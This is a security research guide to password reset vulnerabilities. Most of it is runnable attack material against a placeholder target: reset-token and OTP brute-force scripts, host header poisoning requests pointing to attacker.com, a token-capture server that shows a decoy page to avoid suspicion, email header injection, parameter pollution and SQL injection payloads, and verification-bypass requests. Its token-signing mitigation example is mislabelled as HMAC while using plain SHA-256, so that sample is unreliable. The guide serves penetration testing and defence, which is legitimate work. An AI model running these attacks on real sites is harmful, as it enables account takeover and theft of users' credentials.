# Password Reset Vulnerabilities - Security Research Guide

## Overview

Password reset functionality is one of the most critical and frequently exploited attack surfaces in authentication systems. This document provides comprehensive coverage of password reset vulnerabilities, attack techniques, and testing methodologies.

---

## 1. Token-Based Attacks

### 1.1 Reset Token Prediction

**Vulnerability Description:**
Weak or predictable password reset tokens allow attackers to generate valid tokens for any user account.

**Common Weaknesses:**
- Sequential token generation (incrementing integers)
- Time-based tokens with predictable seeds
- Weak pseudo-random number generators (PRNGs)
- User-derived tokens (MD5/SHA1 of email + timestamp)
- Short token length enabling brute force

**Attack Techniques:**

```python
# Token Pattern Analysis Script
import hashlib
import time
from datetime import datetime

def analyze_token_patterns(tokens):
    """Analyze collected reset tokens for patterns"""
    results = {
        'sequential': check_sequential(tokens),
        'time_based': check_time_correlation(tokens),
        'hash_based': check_common_hashes(tokens),
        'entropy': calculate_entropy(tokens)
    }
    return results

def check_sequential(tokens):
    """Check if tokens are sequential integers or have sequential components"""
    try:
        int_tokens = [int(t, 16) if all(c in '0123456789abcdef' for c in t.lower()) else int(t) for t in tokens]
        diffs = [int_tokens[i+1] - int_tokens[i] for i in range(len(int_tokens)-1)]
        if len(set(diffs)) <= 2:  # Consistent difference
            return {'vulnerable': True, 'pattern': 'sequential', 'diff': diffs[0] if diffs else None}
    except:
        pass
    return {'vulnerable': False}

def predict_next_token(current_token, pattern):
    """Predict next token based on identified pattern"""
    if pattern == 'sequential':
        return hex(int(current_token, 16) + 1)[2:]
    elif pattern == 'time_based':
        # Unix timestamp prediction
        return hashlib.md5(str(int(time.time()) + 1).encode()).hexdigest()
    return None
```

**Common Predictable Token Patterns:**
```
# MD5 of email
Token: md5(user@example.com) = 5d41402abc4b2a76b9719d911017c592

# MD5 of email + timestamp (second precision)
Token: md5(user@example.com + 1706644800) = abc123...

# UUID v1 (contains timestamp and MAC address)
Token: 550e8400-e29b-11d4-a716-446655440000
# Timestamp extractable from UUID v1

# Sequential integers
Token: 100001, 100002, 100003...

# Base64 encoded user ID + timestamp
Token: base64(user_id:timestamp) = MTIzNDU6MTcwNjY0NDgwMA==
```

**Testing Commands:**
```bash
# Request multiple tokens and analyze
for i in {1..10}; do
  curl -s -X POST "https://target.com/api/password/reset" \
    -H "Content-Type: application/json" \
    -d '{"email":"test'$i'@attacker.com"}' | jq -r '.token'
  sleep 1
done > tokens.txt

# Analyze token entropy
cat tokens.txt | while read token; do
  echo "$token - chars: $(echo -n $token | wc -c) - entropy: $(echo -n $token | fold -w1 | sort -u | wc -l)"
done

# Check for base64 patterns
cat tokens.txt | while read token; do
  echo "Token: $token"
  echo "Decoded: $(echo $token | base64 -d 2>/dev/null)"
  echo "---"
done
```

### 1.2 Reset Token Brute Force

**Vulnerability Description:**
Insufficient token length or character set enables brute force attacks against reset tokens.

**Token Strength Analysis:**
```
Token Length  | Character Set | Combinations      | Brute Force Time (1000 req/s)
--------------|---------------|-------------------|------------------------------
6 digits      | 0-9           | 1,000,000         | ~17 minutes
8 chars       | a-z           | 208,827,064,576   | ~6.6 years
16 chars      | a-z0-9        | 7.9 x 10^24       | Infeasible
32 chars      | a-zA-Z0-9     | 2.3 x 10^57       | Infeasible
```

**Brute Force Attack Script:**
```python
import requests
import string
import itertools
from concurrent.futures import ThreadPoolExecutor
import time

class TokenBruteForcer:
    def __init__(self, target_url, token_param='token'):
        self.target_url = target_url
        self.token_param = token_param
        self.found = False
        self.attempts = 0

    def check_token(self, token):
        if self.found:
            return None

        self.attempts += 1
        try:
            response = requests.get(
                self.target_url,
                params={self.token_param: token},
                timeout=5,
                allow_redirects=False
            )

            # Check for valid token indicators
            if response.status_code == 200:
                if 'new password' in response.text.lower() or \
                   'reset your password' in response.text.lower() or \
                   response.status_code != 400:
                    self.found = True
                    return token

        except requests.RequestException:
            pass
        return None

    def brute_force_numeric(self, length=6, threads=50):
        """Brute force numeric tokens"""
        print(f"[*] Brute forcing {length}-digit numeric tokens...")

        with ThreadPoolExecutor(max_workers=threads) as executor:
            tokens = (str(i).zfill(length) for i in range(10**length))
            for result in executor.map(self.check_token, tokens):
                if result:
                    print(f"[+] Valid token found: {result}")
                    return result
                if self.attempts % 10000 == 0:
                    print(f"[*] Attempts: {self.attempts}")
        return None

    def brute_force_otp(self, length=6):
        """Brute force OTP-style tokens"""
        return self.brute_force_numeric(length)

# Usage
# bruteforcer = TokenBruteForcer("https://target.com/reset-password")
# bruteforcer.brute_force_numeric(6)
```

**Burp Intruder Configuration:**
```
# For 6-digit OTP brute force
Attack type: Sniper
Payload type: Numbers
From: 000000
To: 999999
Step: 1
Min integer digits: 6
Max integer digits: 6

# Rate limiting bypass
Resource pool: Create new pool
Maximum concurrent requests: 10
Delay between requests: 100ms (adjust based on rate limiting)
```

### 1.3 Token Leakage Vectors

**1.3.1 Referrer Header Leakage**

When a user clicks a password reset link and the page contains external resources, the token may leak via the Referer header.

**Vulnerable Scenario:**
```html
<!-- Password reset page with external resources -->
<!DOCTYPE html>
<html>
<head>
    <!-- External CSS leaks referrer -->
    <link rel="stylesheet" href="https://cdn.example.com/styles.css">

    <!-- External JS leaks referrer -->
    <script src="https://analytics.external.com/track.js"></script>

    <!-- External image leaks referrer -->
    <img src="https://tracking.external.com/pixel.gif">
</head>
<body>
    <!-- Reset form at URL: https://target.com/reset?token=secret123 -->
    <form action="/reset" method="POST">
        <input type="hidden" name="token" value="secret123">
        <input type="password" name="new_password">
        <button>Reset Password</button>
    </form>
</body>
</html>
```

**Testing for Referrer Leakage:**
```bash
# Check password reset page for external resources
curl -s "https://target.com/reset-password?token=test123" | \
  grep -oP '(src|href)="https?://[^"]+' | \
  grep -v "target.com" | \
  sort -u

# Monitor for leakage (if you control external server)
# On attacker server, check access logs for referrer
tail -f /var/log/nginx/access.log | grep -i referer
```

**1.3.2 Log File Leakage**

Reset tokens in URLs are commonly logged by:
- Web server access logs
- Application logs
- Proxy logs
- Browser history
- CDN logs
- WAF logs

**Testing for Log Exposure:**
```bash
# Check for exposed log files
for path in /logs /log /debug /trace /.git/logs /admin/logs /var/log; do
  curl -s -o /dev/null -w "%{http_code}" "https://target.com$path"
done

# Check for log file disclosure via path traversal
curl -s "https://target.com/download?file=../../../var/log/apache2/access.log" | \
  grep -oP 'token=[a-zA-Z0-9]+'

# Check Wayback Machine for leaked tokens
curl -s "https://web.archive.org/cdx/search/cdx?url=target.com/reset*&output=json" | \
  jq -r '.[1:][] | .[2]' | grep token
```

**1.3.3 Token in Response Headers/Body**

```bash
# Check if token appears in response
curl -s -D - "https://target.com/password/forgot" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}' | \
  grep -iE "(token|reset|link)"

# Check API response for token leakage
curl -s "https://target.com/api/v1/password/reset" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}' | jq .
```

### 1.4 Token Reuse Vulnerabilities

**Vulnerability Description:**
Reset tokens that can be used multiple times or remain valid after use.

**Testing Methodology:**
```python
import requests

def test_token_reuse(reset_url, token, new_password):
    """Test if password reset token can be reused"""

    # First use - should succeed
    response1 = requests.post(reset_url, data={
        'token': token,
        'password': new_password,
        'password_confirm': new_password
    })

    print(f"[*] First use: {response1.status_code}")

    # Second use - should fail if properly implemented
    response2 = requests.post(reset_url, data={
        'token': token,
        'password': 'different_password',
        'password_confirm': 'different_password'
    })

    print(f"[*] Second use: {response2.status_code}")

    if response2.status_code == 200 or 'success' in response2.text.lower():
        print("[!] VULNERABLE: Token can be reused!")
        return True
    else:
        print("[+] Token properly invalidated after use")
        return False
```

### 1.5 Expired Token Acceptance

**Vulnerability Description:**
Application accepts expired password reset tokens.

**Testing Script:**
```python
import requests
import time
from datetime import datetime, timedelta

def test_token_expiry(reset_url, email, forgot_password_url):
    """Test if expired tokens are still accepted"""

    # Request reset token
    requests.post(forgot_password_url, data={'email': email})

    # Extract token (implementation depends on how you receive it)
    token = input("Enter the reset token received: ")

    print(f"[*] Token received at: {datetime.now()}")
    print("[*] Waiting for token to expire...")

    # Test at various intervals
    test_intervals = [
        ('1 hour', 3600),
        ('24 hours', 86400),
        ('48 hours', 172800),
        ('7 days', 604800)
    ]

    for interval_name, seconds in test_intervals:
        print(f"[*] Testing after {interval_name}...")

        # In real testing, you'd wait or use time manipulation
        response = requests.post(reset_url, data={
            'token': token,
            'password': 'NewPassword123!',
            'password_confirm': 'NewPassword123!'
        })

        if response.status_code == 200 or 'success' in response.text.lower():
            print(f"[!] VULNERABLE: Token accepted after {interval_name}")
        else:
            print(f"[+] Token properly expired after {interval_name}")
```

### 1.6 Token in URL Vulnerabilities

**Security Issues with URL-based Tokens:**
1. Browser history exposure
2. Bookmark leakage
3. Shared computer risks
4. Copy/paste exposure
5. Screenshot/screen sharing risks
6. URL shortener logging

**Detection:**
```bash
# Check if reset uses GET parameter
curl -s -I "https://target.com/reset-password?token=test" | grep -i location

# Check for POST vs GET token handling
curl -s -X GET "https://target.com/reset-password?token=VALID_TOKEN" -v 2>&1 | \
  grep -E "(HTTP/|Location:)"
```

---

## 2. Flow-Based Attacks

### 2.1 Host Header Poisoning

**Vulnerability Description:**
The application uses the Host header to construct password reset links, allowing attackers to redirect reset links to malicious domains.

**Attack Flow:**
1. Attacker initiates password reset for victim's email
2. Attacker manipulates Host header to point to attacker-controlled domain
3. Victim receives email with poisoned reset link
4. Victim clicks link, token sent to attacker's server
5. Attacker uses captured token to reset victim's password

**Basic Host Header Injection:**
```bash
# Standard Host header injection
curl -X POST "https://target.com/forgot-password" \
  -H "Host: attacker.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=victim@example.com"

# X-Forwarded-Host injection
curl -X POST "https://target.com/forgot-password" \
  -H "X-Forwarded-Host: attacker.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=victim@example.com"

# X-Host injection
curl -X POST "https://target.com/forgot-password" \
  -H "X-Host: attacker.com" \
  -d "email=victim@example.com"

# X-Forwarded-Server injection
curl -X POST "https://target.com/forgot-password" \
  -H "X-Forwarded-Server: attacker.com" \
  -d "email=victim@example.com"

# Forwarded header (RFC 7239)
curl -X POST "https://target.com/forgot-password" \
  -H "Forwarded: host=attacker.com" \
  -d "email=victim@example.com"
```

**Advanced Host Header Techniques:**
```bash
# Double Host header
curl -X POST "https://target.com/forgot-password" \
  -H "Host: target.com" \
  -H "Host: attacker.com" \
  -d "email=victim@example.com"

# Host with port manipulation
curl -X POST "https://target.com/forgot-password" \
  -H "Host: attacker.com:443" \
  -d "email=victim@example.com"

# Absolute URL in request line
curl -X POST "https://target.com/forgot-password" \
  --request-target "https://attacker.com/forgot-password" \
  -H "Host: attacker.com" \
  -d "email=victim@example.com"

# Host header with @ symbol
curl -X POST "https://target.com/forgot-password" \
  -H "Host: target.com@attacker.com" \
  -d "email=victim@example.com"

# Subdomain injection
curl -X POST "https://target.com/forgot-password" \
  -H "Host: attacker.target.com" \
  -d "email=victim@example.com"

# Tab/space injection
curl -X POST "https://target.com/forgot-password" \
  -H $'Host: target.com\tattacker.com' \
  -d "email=victim@example.com"
```

**Burp Suite Host Header Testing:**
```
# Burp Intruder payload positions
POST /forgot-password HTTP/1.1
Host: $$target.com$$
X-Forwarded-Host: $$$$
X-Host: $$$$
X-Forwarded-Server: $$$$
Forwarded: host=$$$$
X-Original-URL: $$$$
X-Rewrite-URL: $$$$

# Payloads to test
attacker.com
evil.com
attacker.com:443
target.com.attacker.com
target.com@attacker.com
attacker.com#target.com
attacker.com?target.com
```

**Host Header Poisoning Capture Server:**
```python
#!/usr/bin/env python3
"""
Simple server to capture poisoned password reset tokens
Run: python3 capture_server.py
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

class TokenCapture(BaseHTTPRequestHandler):
    def do_GET(self):
        logging.info(f"Request received: {self.path}")
        logging.info(f"Headers: {dict(self.headers)}")

        # Parse and log query parameters (likely contains token)
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        if 'token' in params:
            logging.critical(f"[!] CAPTURED TOKEN: {params['token'][0]}")

        # Return 200 to prevent suspicion
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<html><body><h1>Password Reset</h1><p>Please wait...</p></body></html>')

    def log_message(self, format, *args):
        pass  # Suppress default logging

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 80), TokenCapture)
    logging.info('[*] Starting capture server on port 80...')
    server.serve_forever()
```

### 2.2 Email Parameter Manipulation

**Attack Techniques:**

**2.2.1 Array/Multiple Email Injection:**
```bash
# JSON array injection
curl -X POST "https://target.com/api/forgot-password" \
  -H "Content-Type: application/json" \
  -d '{"email":["victim@example.com","attacker@evil.com"]}'

# Form array injection
curl -X POST "https://target.com/forgot-password" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email[]=victim@example.com&email[]=attacker@evil.com"

# Comma-separated injection
curl -X POST "https://target.com/forgot-password" \
  -d "email=victim@example.com,attacker@evil.com"

# Space-separated injection
curl -X POST "https://target.com/forgot-password" \
  -d "email=victim@example.com attacker@evil.com"

# Semicolon-separated injection
curl -X POST "https://target.com/forgot-password" \
  -d "email=victim@example.com;attacker@evil.com"

# Newline injection
curl -X POST "https://target.com/forgot-password" \
  -d $'email=victim@example.com\ncc:attacker@evil.com'
```

**2.2.2 Email Header Injection:**
```bash
# CC injection
curl -X POST "https://target.com/forgot-password" \
  -d "email=victim@example.com%0aCc:attacker@evil.com"

# BCC injection
curl -X POST "https://target.com/forgot-password" \
  -d "email=victim@example.com%0aBcc:attacker@evil.com"

# CRLF injection
curl -X POST "https://target.com/forgot-password" \
  -d "email=victim@example.com%0d%0aCc:attacker@evil.com"

# Subject injection
curl -X POST "https://target.com/forgot-password" \
  -d "email=victim@example.com%0aSubject:Hacked"
```

**2.2.3 Parameter Pollution:**
```bash
# HTTP Parameter Pollution (HPP)
curl -X POST "https://target.com/forgot-password" \
  -d "email=victim@example.com&email=attacker@evil.com"

# Different parameter names
curl -X POST "https://target.com/forgot-password" \
  -d "email=victim@example.com&user_email=attacker@evil.com"

# Mixed encoding
curl -X POST "https://target.com/forgot-password" \
  -d "email=victim@example.com&%65mail=attacker@evil.com"
```

### 2.3 Username/Email Manipulation

**Normalization Bypass Techniques:**
```bash
# Case manipulation (if database is case-sensitive)
curl -X POST "https://target.com/forgot-password" -d "email=VICTIM@example.com"
curl -X POST "https://target.com/forgot-password" -d "email=ViCtIm@example.com"

# Unicode normalization attacks
curl -X POST "https://target.com/forgot-password" \
  -d "email=v%C4%B1ctim@example.com"  # Turkish dotless i

# Homograph attacks
curl -X POST "https://target.com/forgot-password" \
  -d "email=vict%D1%96m@example.com"  # Cyrillic 'i'

# Leading/trailing space
curl -X POST "https://target.com/forgot-password" \
  -d "email= victim@example.com"
curl -X POST "https://target.com/forgot-password" \
  -d "email=victim@example.com "

# Null byte injection
curl -X POST "https://target.com/forgot-password" \
  -d "email=victim@example.com%00attacker@evil.com"

# Plus addressing exploitation
curl -X POST "https://target.com/forgot-password" \
  -d "email=victim+test@example.com"

# Subdomain email manipulation
curl -X POST "https://target.com/forgot-password" \
  -d "email=victim@mail.example.com"
```

### 2.4 Response Manipulation

**Client-Side Response Manipulation:**
```javascript
// Intercept and modify response using browser DevTools or proxy

// Original response
{"status": "error", "message": "Invalid email address"}

// Modified response (if client-side validation only)
{"status": "success", "message": "Reset email sent"}

// If application shows different behavior based on response
// This can reveal valid/invalid email addresses
```

**Testing for Response-Based Logic:**
```bash
# Capture response and compare
curl -s "https://target.com/forgot-password" \
  -d "email=valid@example.com" | md5sum

curl -s "https://target.com/forgot-password" \
  -d "email=invalid@nonexistent.com" | md5sum

# Compare response times (timing attack)
for email in valid@example.com invalid@nonexistent.com; do
  echo -n "$email: "
  time curl -s -o /dev/null "https://target.com/forgot-password" -d "email=$email"
done
```

### 2.5 Race Conditions

**Vulnerability Description:**
Race conditions in password reset can allow:
1. Multiple valid tokens for same user
2. Token collision attacks
3. Parallel reset requests overwriting each other

**Race Condition Testing:**
```python
import requests
import threading
import time

class PasswordResetRace:
    def __init__(self, target_url, email):
        self.target_url = target_url
        self.email = email
        self.results = []

    def send_reset_request(self, thread_id):
        """Send reset request and capture response"""
        try:
            start = time.time()
            response = requests.post(
                self.target_url,
                data={'email': self.email},
                timeout=10
            )
            elapsed = time.time() - start

            self.results.append({
                'thread_id': thread_id,
                'status_code': response.status_code,
                'elapsed': elapsed,
                'response_length': len(response.text)
            })
        except Exception as e:
            self.results.append({
                'thread_id': thread_id,
                'error': str(e)
            })

    def race_test(self, num_threads=10):
        """Execute race condition test"""
        threads = []

        # Create threads
        for i in range(num_threads):
            t = threading.Thread(target=self.send_reset_request, args=(i,))
            threads.append(t)

        # Start all threads simultaneously
        print(f"[*] Starting {num_threads} concurrent requests...")
        for t in threads:
            t.start()

        # Wait for completion
        for t in threads:
            t.join()

        # Analyze results
        self.analyze_results()

    def analyze_results(self):
        """Analyze race condition results"""
        print("\n[*] Results:")
        for r in self.results:
            print(f"  Thread {r.get('thread_id')}: {r}")

        # Check for anomalies
        status_codes = [r.get('status_code') for r in self.results if 'status_code' in r]
        if len(set(status_codes)) > 1:
            print("[!] WARNING: Different status codes received - possible race condition")

# Usage
# racer = PasswordResetRace("https://target.com/forgot-password", "victim@example.com")
# racer.race_test(20)
```

**Turbo Intruder Script (Burp Suite):**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=100,
                          pipeline=False)

    # Send 100 requests simultaneously
    for i in range(100):
        engine.queue(target.req, target.baseInput)

def handleResponse(req, interesting):
    # Log all responses
    table.add(req)
```

---

## 3. Verification Bypass Techniques

### 3.1 OTP Bypass Methods

**3.1.1 Brute Force OTP:**
```bash
# 4-digit OTP brute force
for i in $(seq 0000 9999); do
  otp=$(printf "%04d" $i)
  response=$(curl -s "https://target.com/verify-otp" \
    -d "otp=$otp&token=RESET_TOKEN")
  if [[ ! "$response" =~ "invalid" ]]; then
    echo "Valid OTP found: $otp"
    break
  fi
done

# 6-digit OTP with threading (Python)
```

```python
import requests
from concurrent.futures import ThreadPoolExecutor

def check_otp(otp):
    response = requests.post(
        "https://target.com/verify-otp",
        data={'otp': otp, 'token': 'RESET_TOKEN'}
    )
    if 'invalid' not in response.text.lower():
        return otp
    return None

with ThreadPoolExecutor(max_workers=50) as executor:
    otps = [f"{i:06d}" for i in range(1000000)]
    for result in executor.map(check_otp, otps):
        if result:
            print(f"Found OTP: {result}")
            break
```

**3.1.2 OTP Manipulation:**
```bash
# Empty OTP
curl -X POST "https://target.com/verify-otp" -d "otp=&token=RESET_TOKEN"

# Null OTP
curl -X POST "https://target.com/verify-otp" -d "otp=null&token=RESET_TOKEN"

# Array OTP
curl -X POST "https://target.com/verify-otp" -d "otp[]=123456&token=RESET_TOKEN"

# Type juggling (PHP)
curl -X POST "https://target.com/verify-otp" \
  -H "Content-Type: application/json" \
  -d '{"otp": 0, "token": "RESET_TOKEN"}'

curl -X POST "https://target.com/verify-otp" \
  -H "Content-Type: application/json" \
  -d '{"otp": true, "token": "RESET_TOKEN"}'

# SQL injection in OTP
curl -X POST "https://target.com/verify-otp" \
  -d "otp=123456' OR '1'='1&token=RESET_TOKEN"
```

**3.1.3 Response Manipulation:**
```javascript
// Original server response
{"verified": false, "error": "Invalid OTP"}

// Manipulated response (using proxy)
{"verified": true, "error": null}
```

**3.1.4 Step Skipping:**
```bash
# Skip OTP verification step entirely
curl -X POST "https://target.com/reset-password" \
  -d "token=RESET_TOKEN&new_password=Hacked123!&confirm_password=Hacked123!"

# Direct access to password change endpoint
curl -X POST "https://target.com/api/user/change-password" \
  -d "user_id=victim_id&new_password=Hacked123!"
```

### 3.2 Security Question Bypass

**Attack Techniques:**
```bash
# Empty answer
curl -X POST "https://target.com/verify-security-question" \
  -d "answer=&token=RESET_TOKEN"

# Common answers dictionary attack
for answer in password 123456 "mother's maiden name" dog cat; do
  curl -s "https://target.com/verify-security-question" \
    -d "answer=$answer&token=RESET_TOKEN"
done

# Case sensitivity test
curl -X POST "https://target.com/verify-security-question" \
  -d "answer=SMITH&token=RESET_TOKEN"
curl -X POST "https://target.com/verify-security-question" \
  -d "answer=smith&token=RESET_TOKEN"

# Unicode normalization
curl -X POST "https://target.com/verify-security-question" \
  -d "answer=sm%C4%B1th&token=RESET_TOKEN"

# SQL injection
curl -X POST "https://target.com/verify-security-question" \
  -d "answer=' OR '1'='1&token=RESET_TOKEN"

# Array injection
curl -X POST "https://target.com/verify-security-question" \
  -d "answer[]=anything&token=RESET_TOKEN"
```

### 3.3 Email Verification Bypass

```bash
# Bypass email verification step
curl -X POST "https://target.com/reset-password" \
  -d "email=victim@example.com&verified=true&new_password=Hacked123!"

# Manipulate verification parameter
curl -X POST "https://target.com/reset-password" \
  -d "token=RESET_TOKEN&email_verified=1&new_password=Hacked123!"

# Token without email ownership verification
curl -X POST "https://target.com/reset-password" \
  -d "token=ANY_TOKEN&email=attacker@evil.com&new_password=Hacked123!"
```

### 3.4 Phone Verification Bypass

```bash
# Bypass SMS verification
curl -X POST "https://target.com/verify-phone" \
  -d "phone=+1234567890&code=000000&bypass=true"

# Default/test codes
for code in 000000 123456 111111 999999; do
  curl -s "https://target.com/verify-phone" \
    -d "code=$code&token=RESET_TOKEN"
done

# International format manipulation
curl -X POST "https://target.com/verify-phone" \
  -d "phone=1234567890"  # Missing country code
curl -X POST "https://target.com/verify-phone" \
  -d "phone=+1-234-567-890"  # Different format
```

---

## 4. Testing Tools and Commands

### 4.1 Burp Suite Extensions

```
Required Extensions:
- Turbo Intruder (race conditions)
- Param Miner (hidden parameters)
- HTTP Request Smuggler (host header attacks)
- Hackvertor (encoding/decoding)
- AuthMatrix (authorization testing)
```

### 4.2 Automated Testing with ffuf

```bash
# Brute force reset tokens
ffuf -w /usr/share/wordlists/tokens.txt \
  -u "https://target.com/reset-password?token=FUZZ" \
  -mc 200 -fc 404,400

# Test email parameter variations
ffuf -w emails.txt \
  -u "https://target.com/forgot-password" \
  -X POST \
  -d "email=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mc all -fc 404

# Host header fuzzing
ffuf -w hosts.txt \
  -u "https://target.com/forgot-password" \
  -X POST \
  -d "email=victim@example.com" \
  -H "Host: FUZZ" \
  -mc all
```

### 4.3 Nuclei Templates

```yaml
# password-reset-poisoning.yaml
id: password-reset-host-poisoning

info:
  name: Password Reset Host Header Poisoning
  author: security-research
  severity: high
  tags: password-reset,host-header

requests:
  - method: POST
    path:
      - "{{BaseURL}}/forgot-password"
      - "{{BaseURL}}/password/reset"
      - "{{BaseURL}}/api/v1/auth/forgot-password"

    headers:
      Host: "{{interactsh-url}}"
      X-Forwarded-Host: "{{interactsh-url}}"

    body: "email=test@example.com"

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"
```

```yaml
# password-reset-token-leakage.yaml
id: password-reset-token-leakage

info:
  name: Password Reset Token in Response
  author: security-research
  severity: medium
  tags: password-reset,token-leakage

requests:
  - method: POST
    path:
      - "{{BaseURL}}/forgot-password"
      - "{{BaseURL}}/api/password/reset"

    body: "email=test@example.com"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - '"token":\s*"[a-zA-Z0-9]{20,}"'
          - 'reset_token.*[a-zA-Z0-9]{20,}'
          - 'resetToken.*[a-zA-Z0-9]{20,}'
```

### 4.4 Custom Testing Script

```python
#!/usr/bin/env python3
"""
Comprehensive Password Reset Vulnerability Scanner
"""

import requests
import time
import hashlib
import re
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor

class PasswordResetTester:
    def __init__(self, base_url, forgot_endpoint, reset_endpoint):
        self.base_url = base_url
        self.forgot_url = urljoin(base_url, forgot_endpoint)
        self.reset_url = urljoin(base_url, reset_endpoint)
        self.session = requests.Session()
        self.vulnerabilities = []

    def test_host_header_poisoning(self, email):
        """Test for host header poisoning"""
        print("[*] Testing host header poisoning...")

        headers_to_test = [
            {'Host': 'evil.com'},
            {'X-Forwarded-Host': 'evil.com'},
            {'X-Host': 'evil.com'},
            {'X-Forwarded-Server': 'evil.com'},
            {'Forwarded': 'host=evil.com'},
        ]

        for headers in headers_to_test:
            try:
                response = self.session.post(
                    self.forgot_url,
                    data={'email': email},
                    headers=headers,
                    timeout=10
                )

                # Check if poisoned host appears in response
                if 'evil.com' in response.text:
                    self.vulnerabilities.append({
                        'type': 'Host Header Poisoning',
                        'header': list(headers.keys())[0],
                        'severity': 'HIGH'
                    })
                    print(f"  [!] Vulnerable to {list(headers.keys())[0]} poisoning!")

            except Exception as e:
                print(f"  [-] Error testing {headers}: {e}")

    def test_token_in_response(self, email):
        """Test if reset token is leaked in response"""
        print("[*] Testing for token leakage in response...")

        response = self.session.post(
            self.forgot_url,
            data={'email': email},
            timeout=10
        )

        # Patterns that might indicate token leakage
        patterns = [
            r'"token":\s*"([a-zA-Z0-9]{16,})"',
            r'reset_token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]{16,})',
            r'resetToken["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]{16,})',
            r'confirmation_token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]{16,})',
        ]

        for pattern in patterns:
            match = re.search(pattern, response.text)
            if match:
                self.vulnerabilities.append({
                    'type': 'Token Leakage in Response',
                    'token_found': match.group(1)[:20] + '...',
                    'severity': 'CRITICAL'
                })
                print(f"  [!] Token found in response!")
                break

    def test_email_enumeration(self, valid_email, invalid_email):
        """Test for email enumeration via response differences"""
        print("[*] Testing for email enumeration...")

        # Test valid email
        resp_valid = self.session.post(
            self.forgot_url,
            data={'email': valid_email},
            timeout=10
        )

        # Test invalid email
        resp_invalid = self.session.post(
            self.forgot_url,
            data={'email': invalid_email},
            timeout=10
        )

        # Compare responses
        if resp_valid.text != resp_invalid.text:
            self.vulnerabilities.append({
                'type': 'Email Enumeration',
                'method': 'Response content differs',
                'severity': 'LOW'
            })
            print("  [!] Email enumeration possible via response content")

        if len(resp_valid.text) != len(resp_invalid.text):
            print("  [!] Email enumeration possible via response length")

    def test_email_parameter_pollution(self, email):
        """Test for email parameter pollution"""
        print("[*] Testing email parameter manipulation...")

        test_cases = [
            {'email': [email, 'attacker@evil.com']},  # Array
            {'email': f'{email},attacker@evil.com'},  # Comma
            {'email': f'{email} attacker@evil.com'},  # Space
            {'email': f'{email};attacker@evil.com'},  # Semicolon
        ]

        for case in test_cases:
            try:
                response = self.session.post(
                    self.forgot_url,
                    data=case,
                    timeout=10
                )

                if response.status_code == 200 and 'success' in response.text.lower():
                    self.vulnerabilities.append({
                        'type': 'Email Parameter Pollution',
                        'payload': str(case),
                        'severity': 'HIGH'
                    })
                    print(f"  [!] Possible vulnerability with: {case}")

            except Exception as e:
                pass

    def run_all_tests(self, email):
        """Run all password reset tests"""
        print(f"\n{'='*60}")
        print(f"Password Reset Vulnerability Scanner")
        print(f"Target: {self.base_url}")
        print(f"{'='*60}\n")

        self.test_host_header_poisoning(email)
        self.test_token_in_response(email)
        self.test_email_enumeration(email, 'nonexistent@invalid.com')
        self.test_email_parameter_pollution(email)

        # Print summary
        print(f"\n{'='*60}")
        print(f"SUMMARY: Found {len(self.vulnerabilities)} potential vulnerabilities")
        print(f"{'='*60}")

        for vuln in self.vulnerabilities:
            print(f"\n[{vuln['severity']}] {vuln['type']}")
            for key, value in vuln.items():
                if key not in ['type', 'severity']:
                    print(f"  - {key}: {value}")

# Usage
if __name__ == "__main__":
    tester = PasswordResetTester(
        base_url="https://target.com",
        forgot_endpoint="/forgot-password",
        reset_endpoint="/reset-password"
    )
    tester.run_all_tests("test@example.com")
```

---

## 5. Mitigation Recommendations

### 5.1 Secure Token Generation

```python
import secrets
import hashlib
import time

def generate_secure_reset_token():
    """Generate cryptographically secure reset token"""
    # Use secrets module for cryptographic randomness
    return secrets.token_urlsafe(32)  # 256 bits of entropy

def generate_token_with_hash(user_id, secret_key):
    """Generate token with HMAC for verification"""
    timestamp = str(int(time.time()))
    data = f"{user_id}:{timestamp}"
    signature = hashlib.sha256(f"{data}:{secret_key}".encode()).hexdigest()
    return f"{data}:{signature}"
```

### 5.2 Secure Token Storage

```sql
-- Store hashed tokens, not plaintext
CREATE TABLE password_reset_tokens (
    id SERIAL PRIMARY KEY,
    user_id INTEGER REFERENCES users(id),
    token_hash VARCHAR(64) NOT NULL,  -- SHA-256 hash of token
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    expires_at TIMESTAMP NOT NULL,
    used_at TIMESTAMP NULL,
    ip_address INET,
    user_agent TEXT
);

-- Index for quick lookups
CREATE INDEX idx_token_hash ON password_reset_tokens(token_hash);
CREATE INDEX idx_expires ON password_reset_tokens(expires_at);
```

### 5.3 Host Header Validation

```python
# Django example
ALLOWED_HOSTS = ['example.com', 'www.example.com']

# Express.js example
app.use((req, res, next) => {
    const allowedHosts = ['example.com', 'www.example.com'];
    const host = req.headers.host?.split(':')[0];

    if (!allowedHosts.includes(host)) {
        return res.status(400).send('Invalid Host header');
    }
    next();
});
```

---

## 6. References and Resources

- OWASP Testing Guide - Password Reset Testing
- OWASP Authentication Cheat Sheet
- PortSwigger Web Security Academy - Password Reset Poisoning
- HackerOne Reports - Password Reset Vulnerabilities
- CWE-640: Weak Password Recovery Mechanism for Forgotten Password
- CWE-620: Unverified Password Change
- RFC 6238 - TOTP Algorithm

---

*Document Version: 1.0*
*Last Updated: 2026-01-30*
*Classification: Security Research Documentation*
